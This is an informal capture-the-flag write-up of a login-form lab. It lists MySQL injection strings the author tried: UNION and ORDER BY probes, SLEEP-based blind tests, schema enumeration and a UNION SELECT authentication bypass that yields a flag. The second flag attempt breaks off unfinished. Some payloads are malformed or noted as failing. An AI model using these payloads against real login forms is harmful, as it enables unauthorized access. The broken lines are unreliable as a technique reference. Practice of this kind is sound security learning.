This lab sends me two messages, one is invalid password and another is invalid username



This doesn't give me errors;
```
' order by 1 -- -
```
This returns me "invalid password"
```
' union select NULL -- -
```
Invalid password too..
```
' union select version() -- -
```

Its Mysql the database because this was true and it worked

```
' union SELECT if (1=1,sleep(10),'a') -- -
```


' union SELECT  FROM information_schema.tables  IF('1'='1' ,SLEEP(10),'a') -- -



OK, the table name was "admins" and i have to search a solution over there .. this was one very creative

```
' UNION SELECT "xyz" as password FROM admins where ''='';--
```
so.. as we know the input of users are vulnerable and not the passwords.. so we put xyz as password and we can log in.... not so easy but it worked

this is the flag 

```
^FLAG^5bb718eceeecd14e2ce19bf5361d1a4961219f0470ca5a40fde1b1b74e1b578c$FLAG$
```


FLAG 2


This worked for me :

This doesnt give me errors
```
' union select schema_name FROM INFORMATION_SCHEMA.SCHEMATA -- -
```

So, now i need to guess the name of this database...

This doesnt give me error, but i need to know
```
' union select (substring(schema_name ,1,1)='a') from information_schema.schemata -- -
```

This do not work 
```
' union select IF((substring(schema_name ,1,1)='b') from information_schema.schemata,SLEEP(10),'a') -- -
```
I will try the dns lookup with data exfiltration...

```
' union select IF(substring(information_schema.schemata ,1,1)='b' ,SLEEP(10),'a') -- -
```

I will quit now.. i cant do it 